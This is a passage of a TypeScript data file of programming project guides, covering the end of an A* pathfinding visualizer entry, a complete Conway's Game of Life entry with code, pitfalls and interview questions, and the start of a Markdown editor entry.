  distance: number; totalDistance: number;
  heuristicDistance: number; previousNode: Node | null;
};

function heuristic(nodeA: Node, nodeB: Node): number {
  // Manhattan distance — admissible for 4-directional grid
  return Math.abs(nodeA.row - nodeB.row) + Math.abs(nodeA.col - nodeB.col);
}

export function aStar(
  grid: Node[][],
  startNode: Node,
  endNode: Node
): { visitedNodesInOrder: Node[]; nodesInShortestPath: Node[] } {
  const visitedNodesInOrder: Node[] = [];
  startNode.distance = 0;
  startNode.heuristicDistance = heuristic(startNode, endNode);
  startNode.totalDistance = startNode.heuristicDistance;

  // Open set: nodes to evaluate — sorted by totalDistance (f = g + h)
  const openSet: Node[] = [startNode];

  while (openSet.length > 0) {
    // Sort ascending by f(n) = g(n) + h(n) — use a min-heap in production
    openSet.sort((a, b) => a.totalDistance - b.totalDistance);
    const current = openSet.shift()!;

    if (current.isWall) continue;
    if (current.distance === Infinity) break; // unreachable

    current.isVisited = true;
    visitedNodesInOrder.push(current);

    if (current === endNode) break;

    for (const neighbor of getNeighbors(current, grid)) {
      if (neighbor.isVisited || neighbor.isWall) continue;
      const tentativeG = current.distance + 1;
      if (tentativeG < neighbor.distance) {
        neighbor.distance = tentativeG;
        neighbor.heuristicDistance = heuristic(neighbor, endNode);
        neighbor.totalDistance = tentativeG + neighbor.heuristicDistance;
        neighbor.previousNode = current;
        if (!openSet.includes(neighbor)) openSet.push(neighbor);
      }
    }
  }
  return { visitedNodesInOrder, nodesInShortestPath: getPath(endNode) };
}

function getPath(endNode: Node): Node[] {
  const path: Node[] = [];
  let current: Node | null = endNode;
  while (current !== null) { path.unshift(current); current = current.previousNode; }
  return path;
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Direct DOM manipulation during animation vs React setState per step',
        picked: 'Direct DOM manipulation',
        reason: 'The grid has 1500+ cells (50x30). Calling setState on every animation step forces React to diff and re-render all Cell components, dropping frame rate below 30fps at medium speed. Direct DOM class manipulation bypasses React entirely during animation, then syncs back to state once complete.',
      },
      {
        choice: 'A* with sorted array vs proper min-heap',
        picked: 'Sorted array for simplicity, with a note to use a heap in production',
        reason: 'Array.sort() on the open set is O(n log n) per iteration — fine for a 50x30 grid (1500 nodes max). A proper min-heap (binary heap) would be O(log n) for push/pop. For a portfolio project, the sorted array is correct and readable. Mention the heap optimization in your README as a known trade-off.',
      },
      {
        choice: 'CSS Grid vs Canvas for grid rendering',
        picked: 'CSS Grid with divs',
        reason: 'CSS Grid makes wall drawing trivially easy — each cell is a real DOM element with click/mouse events. Canvas would require manual hit detection to find which cell was clicked. CSS Grid also integrates naturally with Tailwind for styling. The performance difference only matters above 100x100 grids, which is beyond portfolio scope.',
      },
      {
        choice: 'Immutable grid snapshot for algorithms vs live grid mutation',
        picked: 'Snapshot (deep copy) before running algorithm',
        reason: 'Running the algorithm on a copy prevents the algorithm from seeing walls the user draws mid-run. It also means you can re-run on the same grid state without contamination from previous isVisited flags, since you are starting from a clean copy each time.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why A* outperforms Dijkstra on grids',
        detail: 'Dijkstra explores nodes in rings of equal distance from the start (like expanding circles). A* adds a heuristic that estimates distance to the goal, so it preferentially explores nodes in the direction of the end node. On an open grid, A* with Manhattan distance visits roughly half as many nodes as Dijkstra. The heuristic must be admissible (never overestimates the true cost) to guarantee the shortest path.',
      },
      {
        topic: 'Why DFS does not find the shortest path',
        detail: 'DFS follows one path as deep as possible before backtracking. It will find A path, but not necessarily the shortest one. On a grid, DFS might snake along the left wall all the way to the bottom right, even if the direct route is three steps. BFS guarantees shortest path on unweighted graphs because it explores all nodes at distance k before any at distance k+1.',
      },
      {
        topic: 'Recursive Division maze generation',
        detail: 'Start with an empty grid. Pick a random row and column to draw walls (horizontal and vertical). Punch a random gap in each wall. Recursively apply to each of the four sub-rooms. The base case is when a sub-room is too small to divide (1-2 cells). This produces a perfect maze — every cell is reachable from every other cell, with exactly one path between any two cells.',
      },
      {
        topic: 'Weighted nodes and terrain types',
        detail: 'On a standard unweighted grid, all edges have cost 1. With weighted nodes, some cells cost more to traverse (swamp = 5, road = 1). Dijkstra handles this correctly because it always processes the minimum-cost node next. BFS does NOT handle weights — it counts hops, not cost. A* also handles weights as long as the heuristic remains admissible (h(n) <= true remaining cost).',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Not resetting isVisited and previousNode before re-running',
        why: 'If you run BFS, then run A* on the same grid, the isVisited flags from BFS are still set. A* sees already-visited nodes and skips them, producing incorrect results or finding no path at all.',
        solution: 'Before each algorithm run, reset all non-wall nodes: node.isVisited = false, node.previousNode = null, node.distance = Infinity. You can do this with a grid.forEach(row => row.forEach(node => reset(node))).',
      },
      {
        pitfall: 'Wall drawing fires on every mousemove even when mouse button is up',
        why: 'The mousemove event fires regardless of mouse button state. Without tracking whether the mouse button is held, cells toggle on every mouse hover, not just during drag.',
        solution: 'Track isMouseDown in a ref (not state — state updates are async). Set to true on mousedown on the grid, false on mouseup on the document. Only toggle walls when isMouseDown is true.',
      },
      {
        pitfall: 'Path animation starts before visited animation finishes',
        why: 'If you use Promise.all() or start both setTimeout sequences simultaneously, path nodes start lighting up while the visited expansion is still running, destroying the visual storytelling.',
        solution: 'Chain the animations: return a Promise from the visited animation that resolves when the last node fires, then start the path animation in the .then() callback.',
      },
      {
        pitfall: 'A* heuristic overestimates on diagonal-blocked grids',
        why: 'If you use Euclidean distance as the heuristic but only allow 4-directional movement, the heuristic overestimates (diagonal shortcut is not actually available). An inadmissible heuristic causes A* to find suboptimal paths.',
        solution: 'Use Manhattan distance (|dx| + |dy|) for 4-directional movement. Only use Euclidean for 8-directional (diagonal) movement. Manhattan is always admissible on a standard grid.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Start and end nodes are adjacent',
        impact: 'All algorithms should immediately return the direct path. Some implementations have off-by-one errors in the loop termination condition that cause them to over-explore before reaching the adjacent end.',
        mitigation: 'Check if the start node\'s immediate neighbors include the end node before entering the main loop. Most algorithms handle this naturally, but test explicitly.',
      },
      {
        scenario: 'No path exists (end node fully enclosed by walls)',
        impact: 'The algorithm exhausts all reachable nodes without finding the end. nodesInShortestPath will be empty (the end node has no previousNode). The UI must communicate "No path found" rather than silently doing nothing.',
        mitigation: 'After the algorithm returns, check if endNode.previousNode is null (and endNode is not the startNode). If so, display a "No path found" message in the stats panel.',
      },
      {
        scenario: 'User draws a wall on the start or end node',
        impact: 'If start or end nodes can be walled, the algorithm has no valid source or target. Some implementations crash with a null reference.',
        mitigation: 'In the wall-drawing handler, check if the hovered cell is the start or end node and skip toggling. Only regular cells can become walls.',
      },
      {
        scenario: 'Grid is entirely full of walls except start and end',
        impact: 'The algorithm visits only the start node, finds no neighbors, and returns immediately with an empty path.',
        mitigation: 'This is handled correctly by the no-path case above, but the maze generation should never produce this state. Add a post-generation validation that ensures at least one path exists.',
      },
    ],
    interviewFollowups: [
      {
        question: 'What is the time complexity of your A* implementation?',
        answer: 'With a sorted array as the open set, each iteration sorts in O(V log V) and extracts the minimum in O(1). In the worst case (all nodes visited), total time is O(V² log V). A proper binary min-heap reduces this to O((V + E) log V) — the theoretical optimum for A* on a sparse graph. On a grid where each node has at most 4 neighbors, E = 4V so it simplifies to O(V log V).',
      },
      {
        question: 'How would you make this work for weighted graphs, not just unweighted grids?',
        answer: 'Add a weight property to each node (default 1). In Dijkstra and A*, when relaxing neighbors, use neighbor.distance = current.distance + neighbor.weight instead of +1. BFS cannot handle weights — it must be replaced with Dijkstra or A*. For the visualizer, I would add a weighted node tool that lets users click to assign weight 5 (shown as a different color), and show how this affects Dijkstra vs BFS paths.',
      },
      {
        question: 'Why does your visualizer use direct DOM manipulation instead of React state for animation?',
        answer: 'The grid has 1500+ cells. Calling setState on each animation step schedules a React reconciliation that diffs and patches all Cell components. At medium animation speed (25ms per step), this is 40 setState calls per second on 1500 components — easily dropping below 60fps. Direct DOM className manipulation skips React entirely and takes microseconds per step. I sync back to React state once animation completes so the grid remains consistent.',
      },
      {
        question: 'How would you handle diagonal movement in A*?',
        answer: 'Switch the heuristic from Manhattan to Chebyshev distance: max(|dx|, |dy|). Add diagonal neighbors to getNeighbors (8 directions instead of 4). For diagonal movement cost, use 1.414 (sqrt(2)) rather than 1 to reflect the actual Euclidean distance. The heuristic remains admissible with Chebyshev distance for diagonal movement.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Bidirectional BFS',
        difficulty: 'intermediate',
        description: 'Run BFS simultaneously from both the start and end nodes. When the two frontiers meet, construct the path by joining the two partial paths. Bidirectional BFS visits roughly half as many nodes as standard BFS, making the visual expansion noticeably faster and more impressive.',
      },
      {
        idea: 'Weighted Terrain Types',
        difficulty: 'intermediate',
        description: 'Add a terrain painting tool with types: Road (weight 1), Grass (weight 3), Swamp (weight 7), Mountain (weight 15). Render each terrain as a different color intensity. Show how Dijkstra finds a longer-looking path that avoids high-cost terrain, while BFS takes the straight-line route through mountains.',
      },
      {
        idea: 'Animated Maze Generation',
        difficulty: 'beginner',
        description: 'Instead of instantly showing the finished maze, animate the Recursive Division algorithm step by step — watch walls appear and gaps form in real time. This makes the maze generation itself an educational visualization, not just a setup step.',
      },
      {
        idea: 'Algorithm Speed Comparison Panel',
        difficulty: 'advanced',
        description: 'Run all four algorithms in parallel on the same grid in a 2x2 split layout. Each panel runs independently at the same speed. Show live counters for nodes visited per algorithm. This makes the exploration efficiency differences immediately obvious — A* is dramatically more focused than BFS on long straight paths.',
      },
    ],
  },
  {
    id: 'conways-game-of-life',
    title: "Conway's Game of Life",
    icon: 'grid',
    color: '#22c55e',
    difficulty: 'beginner',
    estimatedTime: '2-3 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Vite'],
    questions: 4,
    description: 'Implement Conway\'s Game of Life — a cellular automaton where cells live, die, or reproduce based on simple rules, creating complex emergent patterns.',
    introduction: 'Build an interactive grid simulation where each cell follows four rules based on its neighbors. Despite the simplicity, this produces fascinating emergent behavior — gliders, oscillators, and still lifes. It is a classic CS project that demonstrates state management, grid computation, and animation loops.\n\nConway\'s Game of Life is a zero-player game invented by mathematician John Conway in 1970. The simulation runs on a grid of cells, each either alive or dead. Four simple rules determine the next generation: underpopulation kills cells with fewer than two neighbors, survival keeps cells with two or three neighbors alive, overpopulation kills cells with more than three neighbors, and reproduction brings dead cells with exactly three neighbors to life. From these four rules alone, astonishingly complex patterns emerge.\n\nBuilding this project teaches you fundamental concepts that transfer to many domains: cellular automata, double-buffering for simultaneous state updates, Canvas rendering for performance, and interactive grid UIs. The implementation is deceptively simple at first but reveals subtle challenges around boundary handling, performance at scale, and state management correctness.\n\nFor interviews, this project is a classic. It appears frequently as a take-home coding challenge, and building it proactively shows initiative. You can discuss Turing completeness, emergent complexity, optimization strategies like Hashlife, and practical engineering decisions like choosing Uint8Array over boolean arrays for performance.',
    interviewRelevance: 'Tests your ability to implement a well-defined algorithm efficiently, manage 2D state, handle edge cases (grid boundaries), and build a clean game loop. Often appears as a coding challenge or take-home assignment. The project demonstrates understanding of simultaneous state updates and why double-buffering is necessary, which maps to concurrent programming concepts. Interviewers can ask about performance optimization (typed arrays vs object arrays, Canvas vs DOM), and you have concrete measurements to reference. The pattern library feature shows you understand data encoding and serialization. Conway\'s Game of Life being Turing complete is a fascinating talking point that demonstrates theoretical CS knowledge. Finally, the game loop architecture (requestAnimationFrame with elapsed-time throttling) translates directly to animation systems, game engines, and real-time data visualizations.',
    learningObjectives: [
      'Implement the four rules of Conway\'s Game of Life with neighbor counting',
      'Build an efficient game loop using requestAnimationFrame or setInterval',
      'Create click-to-toggle interaction for placing live cells',
      'Add presets (Glider, Pulsar, Gosper Glider Gun) and random seed generation',
      'Use double-buffering to ensure correct simultaneous cell state updates',
      'Render the grid on HTML Canvas using putImageData for maximum performance',
      'Implement toroidal wrapping so patterns wrap around grid edges seamlessly',
      'Build a population history graph that tracks live cell count over generations',
      'Support keyboard shortcuts for all simulation controls (play, pause, step, clear, random)',
      'Optimize for large grids (500x500+) using Uint8Array and flat array indexing',
    ],
    keyQuestions: [
      { question: 'What are the four rules?', answer: '1) Any live cell with fewer than 2 live neighbors dies from underpopulation. 2) Any live cell with 2 or 3 live neighbors survives to the next generation. 3) Any live cell with more than 3 live neighbors dies from overpopulation. 4) Any dead cell with exactly 3 live neighbors becomes alive through reproduction. These rules must be applied simultaneously to all cells based on the current generation state, which is why double-buffering is mandatory. If you update cells in place from left to right, later cells will see already-updated neighbors and compute incorrect results. The simultaneous application requirement is the single most important implementation detail.' },
      { question: 'How do I handle grid boundaries?', answer: 'Two approaches exist. Fixed boundaries treat all cells outside the grid as permanently dead, which means cells on the edges have fewer than 8 neighbors and patterns like Gliders disappear when they hit the edge. Toroidal wrapping connects opposite edges: a cell at the right boundary sees the leftmost column as its right neighbor, and similarly for top-bottom. Implement this with modulo arithmetic: neighborRow = (row + dr + height) % height, neighborCol = (col + dc + width) % width. Toroidal wrapping is the better default because it allows infinite movement for spaceships and prevents edge starvation where boundary cells always have fewer neighbors.' },
      { question: 'How do I make the simulation performant?', answer: 'Three key optimizations. First, use double-buffering: maintain two flat Uint8Array buffers (current and next). Read exclusively from current, write exclusively to next, then swap references after each generation. This avoids allocating new arrays per frame and ensures correct simultaneous updates. Second, use Uint8Array instead of a 2D boolean array. A boolean array in JavaScript allocates 32-64 bytes per element due to Value object wrapping. Uint8Array stores 1 byte per cell contiguously in memory, improving cache locality by 10x or more for large grids. Third, render with HTML Canvas putImageData rather than DOM elements. Canvas can update 250,000 pixels in a single GPU-bound call, while 250,000 DOM div updates would be catastrophically slow. For extremely large grids beyond 1,000x1,000, consider the Hashlife algorithm which caches repeated subpatterns in a memoized quadtree.' },
      { question: 'What features make this stand out?', answer: 'Start with the essentials: speed control slider (1 to 60 generations per second), step-by-step mode for studying patterns, generation counter, and population count display. Then add a preset pattern library with famous patterns classified by type: still lifes (Block, Beehive, Loaf), oscillators (Blinker, Pulsar, Pentadecathlon), and spaceships (Glider, LWSS, Gosper Glider Gun). A population history graph rendered below the grid shows live cell count over time, revealing whether patterns grow, oscillate, or die out. Grid zoom control (cell size from 5px to 20px) lets users see both fine detail and large-scale patterns. Finally, adding color-by-cell-age (bright for newly born cells, darker for long-lived cells) creates a visually stunning effect that shows which parts of a pattern are stable versus dynamic.' },
      { question: 'Why is double-buffering mandatory?', answer: 'The four rules specify that all cells update simultaneously based on the current generation. If you update cells in place reading from left to right and top to bottom, cell (0,1) will read the already-updated value of cell (0,0) instead of its value from the current generation. This produces incorrect neighbor counts and visually wrong evolution patterns. For example, a horizontal Blinker (three cells in a row) should oscillate between horizontal and vertical orientations. Without double-buffering, the in-place update corrupts the pattern because the leftmost cell updates first and changes the neighbor count for the middle cell. Double-buffering solves this by reading from one buffer and writing to another, then swapping the references. The swap is an O(1) pointer reassignment, not a copy.' },
      { question: 'What is the significance of Conway\'s Game of Life being Turing complete?', answer: 'Despite having no explicit computation primitives like variables, loops, or conditionals, the Game of Life can simulate any Turing machine. Patterns exist that implement logic gates (AND, OR, NOT) using precisely timed Glider collisions. A complete working computer with memory registers, an ALU, a program counter, and a clock has been constructed entirely within the Game of Life grid. This mathematical result proves that universal computation can emerge from simple local rules, which is a profound insight in complexity theory. In an interview, mentioning this demonstrates awareness of computational theory beyond practical programming, and it naturally leads to discussions about emergence, cellular automata in other domains (traffic modeling, biological simulation), and the limits of computability.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Grid Initialization & Rendering',
        description: 'Set up the grid data structure and render it as a canvas or CSS grid with click-to-toggle interaction.',
        tasks: [
          'Initialize grid as a flat Uint8Array (0 = dead, 1 = alive) — faster than 2D array for large grids',
          'Render grid on an HTML Canvas using fillRect for alive cells and clearRect for dead (or use two colors)',
          'Implement click-to-toggle: convert mouse coordinates to grid row/col and flip cell state',
          'Add click-and-drag to paint cells alive (mousedown + mousemove handler)',
          'Add a random seed button that fills 30% of cells alive using Math.random()',
        ],
      },
      {
        phase: 2,
        title: 'Game Loop & Next Generation',
        description: 'Implement the four rules of Conway\'s Game of Life with double-buffering for correct simultaneous updates.',
        tasks: [
          'Write a countNeighbors(grid, row, col, width, height) function using modulo for toroidal wrapping',
          'Implement computeNextGeneration(current) — iterate all cells, apply rules, write to a separate buffer array',
          'Swap current and next buffer references after each generation (double buffering)',
          'Wire up requestAnimationFrame loop with configurable step interval (generations per second)',
          'Add Play/Pause/Step controls — Step advances exactly one generation then pauses',
        ],
      },
      {
        phase: 3,
        title: 'Presets & Pattern Library',
        description: 'Add a library of famous patterns with coordinates that can be stamped onto the grid.',
        tasks: [
          'Encode classic patterns as coordinate arrays: Glider, Blinker, Pulsar, Gosper Glider Gun, Pentadecathlon',
          'Implement a placePattern(grid, pattern, row, col) function that stamps a pattern at a given origin',
          'Build a Presets dropdown that clears the grid and places the selected pattern centered',
          'Add an import mode where clicking the grid places the selected pattern at the cursor position',
          'Display pattern name, cell count, and classification (still life / oscillator / spaceship)',
        ],
      },
      {
        phase: 4,
        title: 'Stats, Speed Control & Polish',
        description: 'Add generation counter, population tracker, speed control, and deploy.',
        tasks: [
          'Track and display generation count and live cell population in a stats bar',
          'Add speed slider from 1 to 60 generations per second, converting to frame delay',
          'Implement grid zoom (cell size slider from 5px to 20px) with canvas resize',
          'Add keyboard shortcuts: Space = play/pause, R = random fill, C = clear, ArrowRight = step',
          'Deploy to Vercel, write README with screenshot of Gosper Glider Gun in action',
        ],
      },
    ],
    fileStructure: `conways-game-of-life/
├── src/
│   ├── game/
│   │   ├── rules.ts           # computeNextGeneration, countNeighbors
│   │   ├── patterns.ts        # Glider, Pulsar, GosperGliderGun coordinates
│   │   └── grid.ts            # createGrid, randomize, placePattern
│   ├── components/
│   │   ├── GameCanvas.tsx     # HTML Canvas renderer + mouse interaction
│   │   ├── Controls.tsx       # play/pause/step/clear/random buttons
│   │   ├── SpeedSlider.tsx
│   │   ├── PresetSelector.tsx
│   │   └── StatsBar.tsx       # generation count, live cell count
│   ├── hooks/
│   │   ├── useGameLoop.ts     # requestAnimationFrame + interval logic
│   │   └── useGrid.ts         # grid state, double buffer management
│   ├── types/
│   │   └── index.ts           # Grid type, Pattern type, GameState
│   ├── App.tsx
│   └── main.tsx
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Game Logic Layer',
        description: 'Pure functions in /game — computeNextGeneration applies the four rules to produce the next grid state. countNeighbors handles toroidal wrapping with modulo arithmetic. No React dependencies; fully unit testable.',
      },
      {
        name: 'Double-Buffer State Layer (useGrid)',
        description: 'Maintains two Uint8Array buffers (current and next). computeNextGeneration writes into the next buffer. After each step, the references are swapped (O(1) operation). This ensures all cells update simultaneously, avoiding the read-your-own-writes bug.',
      },
      {
        name: 'Game Loop Layer (useGameLoop)',
        description: 'Manages the requestAnimationFrame loop and generation timing. Tracks elapsed time between frames to enforce the target generations-per-second rate. Exposes play, pause, and step functions. Uses a ref for the running flag to avoid stale closures.',
      },
      {
        name: 'Canvas Rendering Layer (GameCanvas)',
        description: 'Renders the Uint8Array grid to an HTML Canvas using putImageData for maximum performance. On each frame, iterates the grid and writes RGBA pixel values directly to an ImageData buffer. Handles mouse events for cell toggling and pattern placement.',
      },
      {
        name: 'Pattern Library Layer',
        description: 'Stores famous patterns as arrays of [row, col] offsets. placePattern stamps a pattern onto the grid at a given origin. Patterns are classified as still lifes (stable), oscillators (periodic), or spaceships (translating).',
      },
    ],
    codeExamples: {
      typescript: `// game/rules.ts

// Flat array index: row * width + col
const idx = (row: number, col: number, w: number) => row * w + col;

export function countNeighbors(
  grid: Uint8Array,
  row: number,
  col: number,
  width: number,
  height: number
): number {
  let count = 0;
  for (let dr = -1; dr <= 1; dr++) {
    for (let dc = -1; dc <= 1; dc++) {
      if (dr === 0 && dc === 0) continue;
      // Toroidal wrapping — edges connect to opposite edges
      const r = (row + dr + height) % height;
      const c = (col + dc + width) % width;
      count += grid[idx(r, c, width)];
    }
  }
  return count;
}

export function computeNextGeneration(
  current: Uint8Array,
  next: Uint8Array,
  width: number,
  height: number
): void {
  for (let row = 0; row < height; row++) {
    for (let col = 0; col < width; col++) {
      const alive = current[idx(row, col, width)];
      const neighbors = countNeighbors(current, row, col, width, height);

      // Conway's four rules:
      // 1. Live cell with 2-3 neighbors survives
      // 2. Dead cell with exactly 3 neighbors becomes alive
      // 3. All other cells die or stay dead
      if (alive) {
        next[idx(row, col, width)] = neighbors === 2 || neighbors === 3 ? 1 : 0;
      } else {
        next[idx(row, col, width)] = neighbors === 3 ? 1 : 0;
      }
    }
  }
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Uint8Array (flat) vs boolean[][] (2D array)',
        picked: 'Uint8Array flat array',
        reason: 'Uint8Array is stored contiguously in memory, giving far better cache locality than a 2D array of JavaScript objects. For a 100x100 grid (10K cells), the difference is negligible. For 500x500 (250K cells), Uint8Array is 3-5x faster due to CPU cache efficiency and no GC pressure from object allocation.',
      },
      {
        choice: 'Canvas rendering vs CSS Grid of divs',
        picked: 'HTML Canvas',
        reason: 'Canvas putImageData can update 250K pixels in one GPU-bound call. CSS Grid of divs requires the DOM to diff and patch up to 250K elements per generation. For small grids (50x50 or less), divs are fine and simpler. For anything larger, Canvas is mandatory for smooth animation.',
      },
      {
        choice: 'requestAnimationFrame vs setInterval for the game loop',
        picked: 'requestAnimationFrame with elapsed-time throttling',
        reason: 'rAF synchronizes with the browser\'s repaint cycle (typically 60fps), avoiding tearing. setInterval can fire mid-paint. For speed control, we throttle inside the rAF callback by accumulating elapsed time and only computing a new generation when enough time has passed for the target fps.',
      },
      {
        choice: 'Toroidal wrapping vs fixed boundaries',
        picked: 'Toroidal wrapping',
        reason: 'Fixed boundaries cause spaceships (like Gliders) to disappear at the edge, which is anti-climactic. Toroidal wrapping means a glider that exits the right side reappears on the left, creating infinite motion. It also prevents edge starvation where cells near borders always have fewer than 8 neighbors.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why double-buffering is mandatory',
        detail: 'The four rules must be applied to all cells simultaneously based on the CURRENT generation state. If you update cells in-place (left to right, top to bottom), later cells see already-updated earlier cells and compute their next state based on the wrong generation. Double-buffering solves this: read from the current buffer, write to the next buffer, then atomically swap references.',
      },
      {
        topic: 'Emergent complexity from simple rules',
        detail: 'The Gosper Glider Gun (discovered 1970) was the first pattern proven to grow unboundedly — it continuously emits Gliders. Gliders are spaceships that translate diagonally across the grid every 4 generations. Still lifes (Block, Beehive) are stable forever. Oscillators (Blinker, Pulsar) cycle with a fixed period. These complex behaviors emerge entirely from 4 simple rules — a famous example of emergent complexity.',
      },
      {
        topic: 'Performance optimization for large grids',
        detail: 'For grids larger than 300x300, naive O(width * height) iteration becomes slow. Hashlife (by Bill Gosper) caches 2^k x 2^k quadrant states and can simulate 2^k generations in O(1) amortized time using memoization. For a portfolio project, the Uint8Array + Canvas approach is sufficient up to 500x500 at 30fps. Mention Hashlife as the production algorithm when discussing scalability.',
      },
      {
        topic: 'Conway\'s Game of Life is Turing complete',
        detail: 'Despite having no explicit computation primitives, GoL can simulate any Turing machine. Patterns exist that implement logic gates (AND, OR, NOT) using Glider collisions. A working computer with memory, ALU, and clock has been constructed entirely within GoL. This mathematical result demonstrates that universal computation can emerge from simple local rules.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Updating cells in-place instead of using a second buffer',
        why: 'When you update cell (0,0) in-place and then compute cell (0,1), cell (0,1) reads the already-updated state of cell (0,0) instead of its state from the current generation. This causes incorrect neighbor counts and visually wrong evolution.',
        solution: 'Maintain two arrays: current and next. Read exclusively from current, write exclusively to next. After processing all cells, swap the references. This guarantees all reads are from the same generation.',
      },
      {
        pitfall: 'Using JavaScript boolean arrays instead of typed arrays for large grids',
        why: 'A JavaScript boolean[] is an array of JavaScript Value objects, each 32-64 bytes in V8. A 500x500 boolean array allocates 12-25MB and causes GC pauses. Accessing non-contiguous memory also destroys CPU cache performance.',
        solution: 'Use Uint8Array(width * height). Each cell is 1 byte, a 500x500 grid is only 250KB, and iteration is 5-10x faster due to cache locality.',
      },
      {
        pitfall: 'Forgetting to clear the canvas before each render',
        why: 'Without ctx.clearRect(0, 0, width, height) at the start of each render, dead cells retain their previous fill color and never visually die.',
        solution: 'Either clear the full canvas each frame (simple but slightly slower), or only fill alive cells and clear dead cells individually (more efficient for sparse grids).',
      },
      {
        pitfall: 'Boundary cells reading out-of-bounds indices',
        why: 'Without boundary handling, cells in row 0 try to count neighbors in row -1 (undefined), causing NaN neighbor counts and incorrect rule application.',
        solution: 'Use toroidal wrapping: r = (row + dr + height) % height. Alternatively, treat out-of-bounds as dead by guarding with a bounds check before reading.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Empty grid (all dead cells)',
        impact: 'computeNextGeneration returns another all-dead grid. The simulation runs but produces no visual change. The generation counter still increments, which can confuse users.',
        mitigation: 'Detect if the grid is entirely dead after each generation and auto-pause with a "Stable: no living cells" message.',
      },
      {
        scenario: 'Stable pattern (still life) runs indefinitely',
        impact: 'A Block or Beehive pattern never changes. The simulation runs forever, consuming CPU and battery without producing anything new.',
        mitigation: 'Optionally detect stability: if current grid equals previous grid (compare Uint8Array buffers), auto-pause with a "Stable: no change" message. This is an optional enhancement, not required.',
      },
      {
        scenario: 'User resizes the browser window mid-simulation',
        impact: 'The canvas element may resize but the internal canvas width/height attributes do not update automatically, causing the grid to render stretched or clipped.',
        mitigation: 'Listen to the ResizeObserver on the canvas container. On resize, recalculate cell size and canvas dimensions. Optionally keep the grid content centered and pad with dead cells.',
      },
      {
        scenario: 'Placing a large preset pattern near grid boundaries',
        impact: 'The Gosper Glider Gun pattern is 36x9 cells. Placing it in the bottom-right corner causes parts of the pattern to overflow the grid and get clipped.',
        mitigation: 'In placePattern, wrap overflow coordinates using toroidal modulo, or clamp them to grid boundaries. Show a warning if the pattern extends beyond the current grid size.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Why did you use a Uint8Array instead of a 2D boolean array?',
        answer: 'Memory layout and cache locality. A JavaScript boolean array is an array of Value pointers — each element is 32-64 bytes in V8. A 200x200 grid would be 1.2-2.5MB, spread across heap allocations. Uint8Array is a contiguous block of 1-byte integers — the same grid is 40KB. CPU cache lines are 64 bytes, so cache misses drop dramatically with contiguous storage. The inner loop of computeNextGeneration accesses memory sequentially, which maximizes cache prefetching.',
      },
      {
        question: 'How would you implement undo/redo for this simulation?',
        answer: 'Since the simulation is deterministic, you only need to store the state at checkpoints. One approach: snapshot the Uint8Array every N generations into a history stack. Undo jumps to the previous checkpoint and re-simulates to the exact generation. More memory-efficient: store only deltas (changed cell coordinates) between generations. For a portfolio project, snapshot every generation up to a max history size (e.g., 100 generations) using a circular buffer.',
      },
      {
        question: 'How would you scale this to support a 10,000 x 10,000 grid?',
        answer: 'At 10K x 10K = 100 million cells, naive iteration is too slow at 60fps. Two approaches: 1) Only iterate cells in the "active zone" — cells that are alive or have alive neighbors. Track this as a Set and only expand the zone when cells change. This is efficient for sparse patterns. 2) Implement Hashlife — a memoized quadtree that can advance 2^k generations in constant amortized time by caching repeated subpatterns. Hashlife is how Golly (the gold-standard GoL simulator) achieves trillion-generation simulations.',
      },
      {
        question: 'Is Conway\'s Game of Life deterministic? What does that imply for testing?',
        answer: 'Yes, it is entirely deterministic — given the same starting state, it always produces the same sequence of generations. This makes testing trivially easy: seed the grid with a known pattern, advance N generations, and assert the exact final state. I can test the Glider pattern by placing it at (0,0) and asserting it translates to (4,4) after 4 generations. No mocks, no randomness to control — pure function testing.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Population History Graph',
        difficulty: 'beginner',
        description: 'Track the live cell count per generation and render a live-updating line chart below the grid. This turns the simulation into a data visualization — you can see population explosions, die-offs, and stable cycles. Interesting patterns create distinctive population signatures.',
      },
      {
        idea: 'Custom Rule Editor (Life-like Cellular Automata)',
        difficulty: 'intermediate',
        description: 'Generalize the rule system to support any B/S notation (Born/Survive). Standard Conway is B3/S23. HighLife is B36/S23 (has a self-replicating pattern). Day & Night is B3678/S34678. Let users type a B/S rule string and instantly see how it changes the simulation dynamics.',
      },
      {
        idea: 'Pattern Editor and Export',
        difficulty: 'intermediate',
        description: 'Add an edit mode where users can draw patterns on a blank grid, then export them as RLE (Run-Length Encoded) format — the standard format for GoL patterns. Users can share their creations, and the app can import any RLE pattern from pattern archives like LifeWiki.',
      },
      {
        idea: 'Color by Cell Age',
        difficulty: 'beginner',
        description: 'Track how many consecutive generations each cell has been alive. Color younger cells bright and older cells darker or vice versa. This visualization shows which parts of a pattern are stable (old cells) versus dynamic (young cells), adding educational depth to pattern observation.',
      },
    ],
  },
  {
    id: 'markdown-editor',
    title: 'Markdown Editor',
    icon: 'edit',
    color: '#a855f7',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Marked.js'],
    questions: 4,
    description: 'Build a split-pane Markdown editor with live preview, syntax highlighting, file management, and export to HTML/PDF.',
